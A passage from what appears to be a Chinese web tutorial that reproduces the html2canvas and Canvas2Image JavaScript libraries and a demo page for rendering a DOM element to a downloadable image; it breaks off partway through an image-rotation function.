PseudoElementContainer.prototype = Object.create(NodeContainer.prototype);

PseudoElementContainer.prototype.appendToDOM = function() {
    if (this.before) {
        this.parent.node.insertBefore(this.node, this.parent.node.firstChild);
    } else {
        this.parent.node.appendChild(this.node);
    }
    this.parent.node.className += " " + this.getHideClass();
};

PseudoElementContainer.prototype.cleanDOM = function() {
    this.node.parentNode.removeChild(this.node);
    this.parent.node.className = this.parent.node.className.replace(this.getHideClass(), "");
};

PseudoElementContainer.prototype.getHideClass = function() {
    return this["PSEUDO_HIDE_ELEMENT_CLASS_" + (this.before ? "BEFORE" : "AFTER")];
};

PseudoElementContainer.prototype.PSEUDO_HIDE_ELEMENT_CLASS_BEFORE = "___html2canvas___pseudoelement_before";
PseudoElementContainer.prototype.PSEUDO_HIDE_ELEMENT_CLASS_AFTER = "___html2canvas___pseudoelement_after";

module.exports = PseudoElementContainer;

},{"./nodecontainer":14}],19:[function(_dereq_,module,exports){
var log = _dereq_('./log');

function Renderer(width, height, images, options, document) {
    this.width = width;
    this.height = height;
    this.images = images;
    this.options = options;
    this.document = document;
}

Renderer.prototype.renderImage = function(container, bounds, borderData, imageContainer) {
    var paddingLeft = container.cssInt('paddingLeft'),
        paddingTop = container.cssInt('paddingTop'),
        paddingRight = container.cssInt('paddingRight'),
        paddingBottom = container.cssInt('paddingBottom'),
        borders = borderData.borders;

    var width = bounds.width - (borders[1].width + borders[3].width + paddingLeft + paddingRight);
    var height = bounds.height - (borders[0].width + borders[2].width + paddingTop + paddingBottom);
    this.drawImage(
        imageContainer,
        0,
        0,
        imageContainer.image.width || width,
        imageContainer.image.height || height,
        bounds.left + paddingLeft + borders[3].width,
        bounds.top + paddingTop + borders[0].width,
        width,
        height
    );
};

Renderer.prototype.renderBackground = function(container, bounds, borderData) {
    if (bounds.height &gt; 0 &amp;&amp; bounds.width &gt; 0) {
        this.renderBackgroundColor(container, bounds);
        this.renderBackgroundImage(container, bounds, borderData);
    }
};

Renderer.prototype.renderBackgroundColor = function(container, bounds) {
    var color = container.color("backgroundColor");
    if (!color.isTransparent()) {
        this.rectangle(bounds.left, bounds.top, bounds.width, bounds.height, color);
    }
};

Renderer.prototype.renderBorders = function(borders) {
    borders.forEach(this.renderBorder, this);
};

Renderer.prototype.renderBorder = function(data) {
    if (!data.color.isTransparent() &amp;&amp; data.args !== null) {
        this.drawShape(data.args, data.color);
    }
};

Renderer.prototype.renderBackgroundImage = function(container, bounds, borderData) {
    var backgroundImages = container.parseBackgroundImages();
    backgroundImages.reverse().forEach(function(backgroundImage, index, arr) {
        switch(backgroundImage.method) {
        case "url":
            var image = this.images.get(backgroundImage.args[0]);
            if (image) {
                this.renderBackgroundRepeating(container, bounds, image, arr.length - (index+1), borderData);
            } else {
                log("Error loading background-image", backgroundImage.args[0]);
            }
            break;
        case "linear-gradient":
        case "gradient":
            var gradientImage = this.images.get(backgroundImage.value);
            if (gradientImage) {
                this.renderBackgroundGradient(gradientImage, bounds, borderData);
            } else {
                log("Error loading background-image", backgroundImage.args[0]);
            }
            break;
        case "none":
            break;
        default:
            log("Unknown background-image type", backgroundImage.args[0]);
        }
    }, this);
};

Renderer.prototype.renderBackgroundRepeating = function(container, bounds, imageContainer, index, borderData) {
    var size = container.parseBackgroundSize(bounds, imageContainer.image, index);
    var position = container.parseBackgroundPosition(bounds, imageContainer.image, index, size);
    var repeat = container.parseBackgroundRepeat(index);
    switch (repeat) {
    case "repeat-x":
    case "repeat no-repeat":
        this.backgroundRepeatShape(imageContainer, position, size, bounds, bounds.left + borderData[3], bounds.top + position.top + borderData[0], 99999, size.height, borderData);
        break;
    case "repeat-y":
    case "no-repeat repeat":
        this.backgroundRepeatShape(imageContainer, position, size, bounds, bounds.left + position.left + borderData[3], bounds.top + borderData[0], size.width, 99999, borderData);
        break;
    case "no-repeat":
        this.backgroundRepeatShape(imageContainer, position, size, bounds, bounds.left + position.left + borderData[3], bounds.top + position.top + borderData[0], size.width, size.height, borderData);
        break;
    default:
        this.renderBackgroundRepeat(imageContainer, position, size, {top: bounds.top, left: bounds.left}, borderData[3], borderData[0]);
        break;
    }
};

module.exports = Renderer;

},{"./log":13}],20:[function(_dereq_,module,exports){
var Renderer = _dereq_('../renderer');
var LinearGradientContainer = _dereq_('../lineargradientcontainer');
var log = _dereq_('../log');

function CanvasRenderer(width, height) {
    Renderer.apply(this, arguments);
    this.canvas = this.options.canvas || this.document.createElement("canvas");
    if (!this.options.canvas) {
        this.canvas.width = width;
        this.canvas.height = height;
    }
    this.ctx = this.canvas.getContext("2d");
    this.taintCtx = this.document.createElement("canvas").getContext("2d");
    this.ctx.textBaseline = "bottom";
    this.variables = {};
    log("Initialized CanvasRenderer with size", width, "x", height);
}

CanvasRenderer.prototype = Object.create(Renderer.prototype);

CanvasRenderer.prototype.setFillStyle = function(fillStyle) {
    this.ctx.fillStyle = typeof(fillStyle) === "object" &amp;&amp; !!fillStyle.isColor ? fillStyle.toString() : fillStyle;
    return this.ctx;
};

CanvasRenderer.prototype.rectangle = function(left, top, width, height, color) {
    this.setFillStyle(color).fillRect(left, top, width, height);
};

CanvasRenderer.prototype.circle = function(left, top, size, color) {
    this.setFillStyle(color);
    this.ctx.beginPath();
    this.ctx.arc(left + size / 2, top + size / 2, size / 2, 0, Math.PI*2, true);
    this.ctx.closePath();
    this.ctx.fill();
};

CanvasRenderer.prototype.circleStroke = function(left, top, size, color, stroke, strokeColor) {
    this.circle(left, top, size, color);
    this.ctx.strokeStyle = strokeColor.toString();
    this.ctx.stroke();
};

CanvasRenderer.prototype.drawShape = function(shape, color) {
    this.shape(shape);
    this.setFillStyle(color).fill();
};

CanvasRenderer.prototype.taints = function(imageContainer) {
    if (imageContainer.tainted === null) {
        this.taintCtx.drawImage(imageContainer.image, 0, 0);
        try {
            this.taintCtx.getImageData(0, 0, 1, 1);
            imageContainer.tainted = false;
        } catch(e) {
            this.taintCtx = document.createElement("canvas").getContext("2d");
            imageContainer.tainted = true;
        }
    }

    return imageContainer.tainted;
};

CanvasRenderer.prototype.drawImage = function(imageContainer, sx, sy, sw, sh, dx, dy, dw, dh) {
    if (!this.taints(imageContainer) || this.options.allowTaint) {
        this.ctx.drawImage(imageContainer.image, sx, sy, sw, sh, dx, dy, dw, dh);
    }
};

CanvasRenderer.prototype.clip = function(shapes, callback, context) {
    this.ctx.save();
    shapes.filter(hasEntries).forEach(function(shape) {
        this.shape(shape).clip();
    }, this);
    callback.call(context);
    this.ctx.restore();
};

CanvasRenderer.prototype.shape = function(shape) {
    this.ctx.beginPath();
    shape.forEach(function(point, index) {
        if (point[0] === "rect") {
            this.ctx.rect.apply(this.ctx, point.slice(1));
        } else {
            this.ctx[(index === 0) ? "moveTo" : point[0] + "To" ].apply(this.ctx, point.slice(1));
        }
    }, this);
    this.ctx.closePath();
    return this.ctx;
};

CanvasRenderer.prototype.font = function(color, style, variant, weight, size, family) {
    this.setFillStyle(color).font = [style, variant, weight, size, family].join(" ").split(",")[0];
};

CanvasRenderer.prototype.fontShadow = function(color, offsetX, offsetY, blur) {
    this.setVariable("shadowColor", color.toString())
        .setVariable("shadowOffsetY", offsetX)
        .setVariable("shadowOffsetX", offsetY)
        .setVariable("shadowBlur", blur);
};

CanvasRenderer.prototype.clearShadow = function() {
    this.setVariable("shadowColor", "rgba(0,0,0,0)");
};

CanvasRenderer.prototype.setOpacity = function(opacity) {
    this.ctx.globalAlpha = opacity;
};

CanvasRenderer.prototype.setTransform = function(transform) {
    this.ctx.translate(transform.origin[0], transform.origin[1]);
    this.ctx.transform.apply(this.ctx, transform.matrix);
    this.ctx.translate(-transform.origin[0], -transform.origin[1]);
};

CanvasRenderer.prototype.setVariable = function(property, value) {
    if (this.variables[property] !== value) {
        this.variables[property] = this.ctx[property] = value;
    }

    return this;
};

CanvasRenderer.prototype.text = function(text, left, bottom) {
    this.ctx.fillText(text, left, bottom);
};

CanvasRenderer.prototype.backgroundRepeatShape = function(imageContainer, backgroundPosition, size, bounds, left, top, width, height, borderData) {
    var shape = [
        ["line", Math.round(left), Math.round(top)],
        ["line", Math.round(left + width), Math.round(top)],
        ["line", Math.round(left + width), Math.round(height + top)],
        ["line", Math.round(left), Math.round(height + top)]
    ];
    this.clip([shape], function() {
        this.renderBackgroundRepeat(imageContainer, backgroundPosition, size, bounds, borderData[3], borderData[0]);
    }, this);
};

CanvasRenderer.prototype.renderBackgroundRepeat = function(imageContainer, backgroundPosition, size, bounds, borderLeft, borderTop) {
    var offsetX = Math.round(bounds.left + backgroundPosition.left + borderLeft), offsetY = Math.round(bounds.top + backgroundPosition.top + borderTop);
    this.setFillStyle(this.ctx.createPattern(this.resizeImage(imageContainer, size), "repeat"));
    this.ctx.translate(offsetX, offsetY);
    this.ctx.fill();
    this.ctx.translate(-offsetX, -offsetY);
};

CanvasRenderer.prototype.renderBackgroundGradient = function(gradientImage, bounds) {
    if (gradientImage instanceof LinearGradientContainer) {
        var gradient = this.ctx.createLinearGradient(
            bounds.left + bounds.width * gradientImage.x0,
            bounds.top + bounds.height * gradientImage.y0,
            bounds.left +  bounds.width * gradientImage.x1,
            bounds.top +  bounds.height * gradientImage.y1);
        gradientImage.colorStops.forEach(function(colorStop) {
            gradient.addColorStop(colorStop.stop, colorStop.color.toString());
        });
        this.rectangle(bounds.left, bounds.top, bounds.width, bounds.height, gradient);
    }
};

CanvasRenderer.prototype.resizeImage = function(imageContainer, size) {
    var image = imageContainer.image;
    if(image.width === size.width &amp;&amp; image.height === size.height) {
        return image;
    }

    var ctx, canvas = document.createElement('canvas');
    canvas.width = size.width;
    canvas.height = size.height;
    ctx = canvas.getContext("2d");
    ctx.drawImage(image, 0, 0, image.width, image.height, 0, 0, size.width, size.height );
    return canvas;
};

function hasEntries(array) {
    return array.length &gt; 0;
}

module.exports = CanvasRenderer;

},{"../lineargradientcontainer":12,"../log":13,"../renderer":19}],21:[function(_dereq_,module,exports){
var NodeContainer = _dereq_('./nodecontainer');

function StackingContext(hasOwnStacking, opacity, element, parent) {
    NodeContainer.call(this, element, parent);
    this.ownStacking = hasOwnStacking;
    this.contexts = [];
    this.children = [];
    this.opacity = (this.parent ? this.parent.stack.opacity : 1) * opacity;
}

StackingContext.prototype = Object.create(NodeContainer.prototype);

StackingContext.prototype.getParentStack = function(context) {
    var parentStack = (this.parent) ? this.parent.stack : null;
    return parentStack ? (parentStack.ownStacking ? parentStack : parentStack.getParentStack(context)) : context.stack;
};

module.exports = StackingContext;

},{"./nodecontainer":14}],22:[function(_dereq_,module,exports){
function Support(document) {
    this.rangeBounds = this.testRangeBounds(document);
    this.cors = this.testCORS();
    this.svg = this.testSVG();
}

Support.prototype.testRangeBounds = function(document) {
    var range, testElement, rangeBounds, rangeHeight, support = false;

    if (document.createRange) {
        range = document.createRange();
        if (range.getBoundingClientRect) {
            testElement = document.createElement('boundtest');
            testElement.style.height = "123px";
            testElement.style.display = "block";
            document.body.appendChild(testElement);

            range.selectNode(testElement);
            rangeBounds = range.getBoundingClientRect();
            rangeHeight = rangeBounds.height;

            if (rangeHeight === 123) {
                support = true;
            }
            document.body.removeChild(testElement);
        }
    }

    return support;
};

Support.prototype.testCORS = function() {
    return typeof((new Image()).crossOrigin) !== "undefined";
};

Support.prototype.testSVG = function() {
    var img = new Image();
    var canvas = document.createElement("canvas");
    var ctx =  canvas.getContext("2d");
    img.src = "data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg'&gt;&lt;/svg&gt;";

    try {
        ctx.drawImage(img, 0, 0);
        canvas.toDataURL();
    } catch(e) {
        return false;
    }
    return true;
};

module.exports = Support;

},{}],23:[function(_dereq_,module,exports){
var XHR = _dereq_('./xhr');
var decode64 = _dereq_('./utils').decode64;

function SVGContainer(src) {
    this.src = src;
    this.image = null;
    var self = this;

    this.promise = this.hasFabric().then(function() {
        return (self.isInline(src) ? Promise.resolve(self.inlineFormatting(src)) : XHR(src));
    }).then(function(svg) {
        return new Promise(function(resolve) {
            window.html2canvas.svg.fabric.loadSVGFromString(svg, self.createCanvas.call(self, resolve));
        });
    });
}

SVGContainer.prototype.hasFabric = function() {
    return !window.html2canvas.svg || !window.html2canvas.svg.fabric ? Promise.reject(new Error("html2canvas.svg.js is not loaded, cannot render svg")) : Promise.resolve();
};

SVGContainer.prototype.inlineFormatting = function(src) {
    return (/^data:image\/svg\+xml;base64,/.test(src)) ? this.decode64(this.removeContentType(src)) : this.removeContentType(src);
};

SVGContainer.prototype.removeContentType = function(src) {
    return src.replace(/^data:image\/svg\+xml(;base64)?,/,'');
};

SVGContainer.prototype.isInline = function(src) {
    return (/^data:image\/svg\+xml/i.test(src));
};

SVGContainer.prototype.createCanvas = function(resolve) {
    var self = this;
    return function (objects, options) {
        var canvas = new window.html2canvas.svg.fabric.StaticCanvas('c');
        self.image = canvas.lowerCanvasEl;
        canvas
            .setWidth(options.width)
            .setHeight(options.height)
            .add(window.html2canvas.svg.fabric.util.groupSVGElements(objects, options))
            .renderAll();
        resolve(canvas.lowerCanvasEl);
    };
};

SVGContainer.prototype.decode64 = function(str) {
    return (typeof(window.atob) === "function") ? window.atob(str) : decode64(str);
};

module.exports = SVGContainer;

},{"./utils":26,"./xhr":28}],24:[function(_dereq_,module,exports){
var SVGContainer = _dereq_('./svgcontainer');

function SVGNodeContainer(node, _native) {
    this.src = node;
    this.image = null;
    var self = this;

    this.promise = _native ? new Promise(function(resolve, reject) {
        self.image = new Image();
        self.image.onload = resolve;
        self.image.onerror = reject;
        self.image.src = "data:image/svg+xml," + (new XMLSerializer()).serializeToString(node);
        if (self.image.complete === true) {
            resolve(self.image);
        }
    }) : this.hasFabric().then(function() {
        return new Promise(function(resolve) {
            window.html2canvas.svg.fabric.parseSVGDocument(node, self.createCanvas.call(self, resolve));
        });
    });
}

SVGNodeContainer.prototype = Object.create(SVGContainer.prototype);

module.exports = SVGNodeContainer;

},{"./svgcontainer":23}],25:[function(_dereq_,module,exports){
var NodeContainer = _dereq_('./nodecontainer');

function TextContainer(node, parent) {
    NodeContainer.call(this, node, parent);
}

TextContainer.prototype = Object.create(NodeContainer.prototype);

TextContainer.prototype.applyTextTransform = function() {
    this.node.data = this.transform(this.parent.css("textTransform"));
};

TextContainer.prototype.transform = function(transform) {
    var text = this.node.data;
    switch(transform){
        case "lowercase":
            return text.toLowerCase();
        case "capitalize":
            return text.replace(/(^|\s|:|-|\(|\))([a-z])/g, capitalize);
        case "uppercase":
            return text.toUpperCase();
        default:
            return text;
    }
};

function capitalize(m, p1, p2) {
    if (m.length &gt; 0) {
        return p1 + p2.toUpperCase();
    }
}

module.exports = TextContainer;

},{"./nodecontainer":14}],26:[function(_dereq_,module,exports){
exports.smallImage = function smallImage() {
    return "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
};

exports.bind = function(callback, context) {
    return function() {
        return callback.apply(context, arguments);
    };
};

/*
 * base64-arraybuffer
 * https://github.com/niklasvh/base64-arraybuffer
 *
 * Copyright (c) 2012 Niklas von Hertzen
 * Licensed under the MIT license.
 */

exports.decode64 = function(base64) {
    var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var len = base64.length, i, encoded1, encoded2, encoded3, encoded4, byte1, byte2, byte3;

    var output = "";

    for (i = 0; i &lt; len; i+=4) {
        encoded1 = chars.indexOf(base64[i]);
        encoded2 = chars.indexOf(base64[i+1]);
        encoded3 = chars.indexOf(base64[i+2]);
        encoded4 = chars.indexOf(base64[i+3]);

        byte1 = (encoded1 &lt;&lt; 2) | (encoded2 &gt;&gt; 4);
        byte2 = ((encoded2 &amp; 15) &lt;&lt; 4) | (encoded3 &gt;&gt; 2);
        byte3 = ((encoded3 &amp; 3) &lt;&lt; 6) | encoded4;
        if (encoded3 === 64) {
            output += String.fromCharCode(byte1);
        } else if (encoded4 === 64 || encoded4 === -1) {
            output += String.fromCharCode(byte1, byte2);
        } else{
            output += String.fromCharCode(byte1, byte2, byte3);
        }
    }

    return output;
};

exports.getBounds = function(node) {
    if (node.getBoundingClientRect) {
        var clientRect = node.getBoundingClientRect();
        var width = node.offsetWidth == null ? clientRect.width : node.offsetWidth;
        return {
            top: clientRect.top,
            bottom: clientRect.bottom || (clientRect.top + clientRect.height),
            right: clientRect.left + width,
            left: clientRect.left,
            width:  width,
            height: node.offsetHeight == null ? clientRect.height : node.offsetHeight
        };
    }
    return {};
};

exports.offsetBounds = function(node) {
    var parent = node.offsetParent ? exports.offsetBounds(node.offsetParent) : {top: 0, left: 0};

    return {
        top: node.offsetTop + parent.top,
        bottom: node.offsetTop + node.offsetHeight + parent.top,
        right: node.offsetLeft + parent.left + node.offsetWidth,
        left: node.offsetLeft + parent.left,
        width: node.offsetWidth,
        height: node.offsetHeight
    };
};

exports.parseBackgrounds = function(backgroundImage) {
    var whitespace = ' \r\n\t',
        method, definition, prefix, prefix_i, block, results = [],
        mode = 0, numParen = 0, quote, args;
    var appendResult = function() {
        if(method) {
            if (definition.substr(0, 1) === '"') {
                definition = definition.substr(1, definition.length - 2);
            }
            if (definition) {
                args.push(definition);
            }
            if (method.substr(0, 1) === '-' &amp;&amp; (prefix_i = method.indexOf('-', 1 ) + 1) &gt; 0) {
                prefix = method.substr(0, prefix_i);
                method = method.substr(prefix_i);
            }
            results.push({
                prefix: prefix,
                method: method.toLowerCase(),
                value: block,
                args: args,
                image: null
            });
        }
        args = [];
        method = prefix = definition = block = '';
    };
    args = [];
    method = prefix = definition = block = '';
    backgroundImage.split("").forEach(function(c) {
        if (mode === 0 &amp;&amp; whitespace.indexOf(c) &gt; -1) {
            return;
        }
        switch(c) {
        case '"':
            if(!quote) {
                quote = c;
            } else if(quote === c) {
                quote = null;
            }
            break;
        case '(':
            if(quote) {
                break;
            } else if(mode === 0) {
                mode = 1;
                block += c;
                return;
            } else {
                numParen++;
            }
            break;
        case ')':
            if (quote) {
                break;
            } else if(mode === 1) {
                if(numParen === 0) {
                    mode = 0;
                    block += c;
                    appendResult();
                    return;
                } else {
                    numParen--;
                }
            }
            break;

        case ',':
            if (quote) {
                break;
            } else if(mode === 0) {
                appendResult();
                return;
            } else if (mode === 1) {
                if (numParen === 0 &amp;&amp; !method.match(/^url$/i)) {
                    args.push(definition);
                    definition = '';
                    block += c;
                    return;
                }
            }
            break;
        }

        block += c;
        if (mode === 0) {
            method += c;
        } else {
            definition += c;
        }
    });

    appendResult();
    return results;
};

},{}],27:[function(_dereq_,module,exports){
var GradientContainer = _dereq_('./gradientcontainer');

function WebkitGradientContainer(imageData) {
    GradientContainer.apply(this, arguments);
    this.type = imageData.args[0] === "linear" ? GradientContainer.TYPES.LINEAR : GradientContainer.TYPES.RADIAL;
}

WebkitGradientContainer.prototype = Object.create(GradientContainer.prototype);

module.exports = WebkitGradientContainer;

},{"./gradientcontainer":9}],28:[function(_dereq_,module,exports){
function XHR(url) {
    return new Promise(function(resolve, reject) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url);

        xhr.onload = function() {
            if (xhr.status === 200) {
                resolve(xhr.responseText);
            } else {
                reject(new Error(xhr.statusText));
            }
        };

        xhr.onerror = function() {
            reject(new Error("Network Error"));
        };

        xhr.send();
    });
}

module.exports = XHR;

},{}]},{},[4])(4)
});</code></pre>
<h2><span style="color:#3399ea;"><strong>&nbsp;2canvas2image.js</strong></span></h2>
<pre class="has">
<code>/*
 * Canvas2Image v0.1
 * Copyright (c) 2008 Jacob Seidelin, jseidelin@nihilogic.dk
 * MIT License [http://www.opensource.org/licenses/mit-license.php]
 */
 
var Canvas2Image = (function() {
 
	// check if we have canvas support
	var bHasCanvas = false;
	var oCanvas = document.createElement("canvas");
	if (oCanvas.getContext("2d")) {
		bHasCanvas = true;
	}
 
	// no canvas, bail out.
	if (!bHasCanvas) {
		return {
			saveAsBMP : function(){},
			saveAsPNG : function(){},
			saveAsJPEG : function(){}
		}
	}
 
	var bHasImageData = !!(oCanvas.getContext("2d").getImageData);
	var bHasDataURL = !!(oCanvas.toDataURL);
	var bHasBase64 = !!(window.btoa);
 
	var strDownloadMime = "image/octet-stream";
 
	// ok, we're good
	var readCanvasData = function(oCanvas) {
		var iWidth = parseInt(oCanvas.width);
		var iHeight = parseInt(oCanvas.height);
		return oCanvas.getContext("2d").getImageData(0,0,iWidth,iHeight);
	}
 
	// base64 encodes either a string or an array of charcodes
	var encodeData = function(data) {
		var strData = "";
		if (typeof data == "string") {
			strData = data;
		} else {
			var aData = data;
			for (var i=0;i&lt;aData.length;i++) {
				strData += String.fromCharCode(aData[i]);
			}
		}
		return btoa(strData);
	}
 
	// creates a base64 encoded string containing BMP data
	// takes an imagedata object as argument
	var createBMP = function(oData) {
		var aHeader = [];
	
		var iWidth = oData.width;
		var iHeight = oData.height;
 
		aHeader.push(0x42); // magic 1
		aHeader.push(0x4D); 
	
		var iFileSize = iWidth*iHeight*3 + 54; // total header size = 54 bytes
		aHeader.push(iFileSize % 256); iFileSize = Math.floor(iFileSize / 256);
		aHeader.push(iFileSize % 256); iFileSize = Math.floor(iFileSize / 256);
		aHeader.push(iFileSize % 256); iFileSize = Math.floor(iFileSize / 256);
		aHeader.push(iFileSize % 256);
 
		aHeader.push(0); // reserved
		aHeader.push(0);
		aHeader.push(0); // reserved
		aHeader.push(0);
 
		aHeader.push(54); // dataoffset
		aHeader.push(0);
		aHeader.push(0);
		aHeader.push(0);
 
		var aInfoHeader = [];
		aInfoHeader.push(40); // info header size
		aInfoHeader.push(0);
		aInfoHeader.push(0);
		aInfoHeader.push(0);
 
		var iImageWidth = iWidth;
		aInfoHeader.push(iImageWidth % 256); iImageWidth = Math.floor(iImageWidth / 256);
		aInfoHeader.push(iImageWidth % 256); iImageWidth = Math.floor(iImageWidth / 256);
		aInfoHeader.push(iImageWidth % 256); iImageWidth = Math.floor(iImageWidth / 256);
		aInfoHeader.push(iImageWidth % 256);
	
		var iImageHeight = iHeight;
		aInfoHeader.push(iImageHeight % 256); iImageHeight = Math.floor(iImageHeight / 256);
		aInfoHeader.push(iImageHeight % 256); iImageHeight = Math.floor(iImageHeight / 256);
		aInfoHeader.push(iImageHeight % 256); iImageHeight = Math.floor(iImageHeight / 256);
		aInfoHeader.push(iImageHeight % 256);
	
		aInfoHeader.push(1); // num of planes
		aInfoHeader.push(0);
	
		aInfoHeader.push(24); // num of bits per pixel
		aInfoHeader.push(0);
	
		aInfoHeader.push(0); // compression = none
		aInfoHeader.push(0);
		aInfoHeader.push(0);
		aInfoHeader.push(0);
	
		var iDataSize = iWidth*iHeight*3; 
		aInfoHeader.push(iDataSize % 256); iDataSize = Math.floor(iDataSize / 256);
		aInfoHeader.push(iDataSize % 256); iDataSize = Math.floor(iDataSize / 256);
		aInfoHeader.push(iDataSize % 256); iDataSize = Math.floor(iDataSize / 256);
		aInfoHeader.push(iDataSize % 256); 
	
		for (var i=0;i&lt;16;i++) {
			aInfoHeader.push(0);	// these bytes not used
		}
	
		var iPadding = (4 - ((iWidth * 3) % 4)) % 4;
 
		var aImgData = oData.data;
 
		var strPixelData = "";
		var y = iHeight;
		do {
			var iOffsetY = iWidth*(y-1)*4;
			var strPixelRow = "";
			for (var x=0;x&lt;iWidth;x++) {
				var iOffsetX = 4*x;
 
				strPixelRow += String.fromCharCode(aImgData[iOffsetY+iOffsetX+2]);
				strPixelRow += String.fromCharCode(aImgData[iOffsetY+iOffsetX+1]);
				strPixelRow += String.fromCharCode(aImgData[iOffsetY+iOffsetX]);
			}
			for (var c=0;c&lt;iPadding;c++) {
				strPixelRow += String.fromCharCode(0);
			}
			strPixelData += strPixelRow;
		} while (--y);
 
		var strEncoded = encodeData(aHeader.concat(aInfoHeader)) + encodeData(strPixelData);
 
		return strEncoded;
	}
 
 
	// sends the generated file to the client
	var saveFile = function(strData) {
		document.location.href = strData;
	}
 
	var makeDataURI = function(strData, strMime) {
		return "data:" + strMime + ";base64," + strData;
	}
 
	// generates a &lt;img&gt; object containing the imagedata
	var makeImageObject = function(strSource) {
		var oImgElement = document.createElement("img");
		oImgElement.src = strSource;
		return oImgElement;
	}
 
	var scaleCanvas = function(oCanvas, iWidth, iHeight) {
		if (iWidth &amp;&amp; iHeight) {
			var oSaveCanvas = document.createElement("canvas");
			oSaveCanvas.width = iWidth;
			oSaveCanvas.height = iHeight;
			oSaveCanvas.style.width = iWidth+"px";
			oSaveCanvas.style.height = iHeight+"px";
 
			var oSaveCtx = oSaveCanvas.getContext("2d");
 
			oSaveCtx.drawImage(oCanvas, 0, 0, oCanvas.width, oCanvas.height, 0, 0, iWidth, iHeight);
			return oSaveCanvas;
		}
		return oCanvas;
	}
 
	return {
 
		saveAsPNG : function(oCanvas, bReturnImg, iWidth, iHeight) {
			if (!bHasDataURL) {
				return false;
			}
			var oScaledCanvas = scaleCanvas(oCanvas, iWidth, iHeight);
			var strData = oScaledCanvas.toDataURL("image/png");
			if (bReturnImg) {
				return makeImageObject(strData);
			} else {
				saveFile(strData.replace("image/png", strDownloadMime));
			}
			return true;
		},
 
		saveAsJPEG : function(oCanvas, bReturnImg, iWidth, iHeight) {
			if (!bHasDataURL) {
				return false;
			}
 
			var oScaledCanvas = scaleCanvas(oCanvas, iWidth, iHeight);
			var strMime = "image/jpeg";
			var strData = oScaledCanvas.toDataURL(strMime);
	
			// check if browser actually supports jpeg by looking for the mime type in the data uri.
			// if not, return false
			if (strData.indexOf(strMime) != 5) {
				return false;
			}
 
			if (bReturnImg) {
				return makeImageObject(strData);
			} else {
				saveFile(strData.replace(strMime, strDownloadMime));
			}
			return true;
		},
 
		saveAsBMP : function(oCanvas, bReturnImg, iWidth, iHeight) {
			if (!(bHasImageData &amp;&amp; bHasBase64)) {
				return false;
			}
 
			var oScaledCanvas = scaleCanvas(oCanvas, iWidth, iHeight);
 
			var oData = readCanvasData(oScaledCanvas);
			var strImgData = createBMP(oData);
			if (bReturnImg) {
				return makeImageObject(makeDataURI(strImgData, "image/bmp"));
			} else {
				saveFile(makeDataURI(strImgData, strDownloadMime));
			}
			return true;
		}
	};
 
})();</code></pre>
<h2><span style="color:#3399ea;">3jq一如你所拥用的jq</span></h2>
<h2>&nbsp;</h2>
<h2><span style="color:#3399ea;">4实现代码&nbsp;</span></h2>
<pre class="has">
<code>&lt;!DOCTYPE html&gt;
&lt;html lang="zh-cn"&gt;

&lt;head&gt;
    &lt;title&gt;将dom节点生成img图片&lt;/title&gt;
    &lt;style&gt;
        * {
            margin: 0;
            padding: 0;
            list-style: none;
            box-sizing: border-box;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
        }

        .layui-layer {
            background: none;
            box-shadow: 0px 0px 0px;
        }

        .dzhd_bg {
            position: absolute;
            left: 0;
            top: 0;
            bottom: 0;
            right: 0;
            z-index: -1;
        }

        .dzhd-con {
            position: relative;
            width: 400px;
            height: 400px;
            /*background:url("/images/dfmx-klt.png") no-repeat center top;*/
            padding: 230px 60px 0;
        }

        .dzhd-con ul {
            background: rgba(207, 215, 222, 0.20);
            padding: 20px 10px;
        }

        img {
            max-width: 100%;
        }

        .dzhd-con ul:nth-of-type(2) {
            background: none;
        }
    &lt;/style&gt;
    &lt;script src="/creatImg/jquery.min.js"&gt;&lt;/script&gt;
    &lt;script src="/creatImg/html2canvas.js"&gt;&lt;/script&gt;
    &lt;script src="/creatImg/canvas2image.js"&gt;&lt;/script&gt;

&lt;body&gt;
    &lt;h3&gt;将dom节点生成img图片
        &lt;span&gt;必须再服务器上才可以生成&lt;/span&gt;
    &lt;/h3&gt;
    &lt;div class="common-container common-concc"&gt;
        &lt;!--电子回单弹窗--&gt;
        &lt;div class="dzhd-pop"&gt;
            &lt;div class="dzhd-con" id="shareContent"&gt;
                &lt;div class="dzhd_bg"&gt;
                    &lt;img src="/creatImg/receipt.png" alt=""&gt;
                &lt;/div&gt;
            &lt;/div&gt;
            &lt;div onclick="cr()"&gt;
                点我生成图片
            &lt;/div&gt;
        &lt;/div&gt;

        &lt;div id="shareQrCodeImg" style="display: none"&gt;

        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;

&lt;script&gt;
    function cr() {
        html2Canvas();
    }


    /*要在服务器里上传图片*/
    var getBase64Url = function (obj, callback) {
        var image = new Image();
        // 引用外部图片，需设置 crossOrigin 属性，否则 toDataURL 调用异常
        image.setAttribute('crossOrigin', 'anonymous');
        image.onload = function () {
            var canvas = document.createElement("canvas");
            var context = canvas.getContext("2d");
            canvas.width = obj.width || image.width;
            canvas.height = obj.height || image.height;
            context.drawImage(image, 0, 0);
            // 最终生成的图片 base64 字符串
            var base64Image = canvas.toDataURL();
            callback &amp;&amp; callback(base64Image);
            //	        console.log(base64Image);
        };
        // 将 src 换成 base64 字符串
        console.log(121313)
        if (obj.src) {
            image.src = obj.src;
        }

    }
    //生成图base64编码
    getBase64Url({
        width: 750,
        height: 750,
        src: $("#bannerImgCORS").attr("src")
    }, function (base64Image) {
        // $("#bannerImgCORS").attr({
        // 	"src": base64Image
        // });
    });
    getBase64Url({
        src: $("#avatarImgCORS").attr("src")
    }, function (base64Image) {
        $("#avatarImgCORS").attr({
            "src": base64Image
        });
    });

    //对图片旋转处理 
    var rotateImg = function (img, direction, canvas) {
        //alert(img);  
        //最小与最大旋转方向，图片旋转4次后回到原方向    
        var min_step = 0;
        var max_step = 3;
        //var img = document.getElementById(pid);    
        if (img == null)
            return;
        //img的高度和宽度不能在img元素隐藏后获取，否则会出错    
        var height = img.height;
        var width = img.width;
        //var step = img.getAttribute('step');    
        var step = 2;
        if (step == null) {
            step = min_step;
        }
        if (direction == 'right') {
            step++;
            //旋转到原位置，即超过最大值    
            step &gt; max_step &amp;&amp; (step = min_step);
        } else {
            step--;
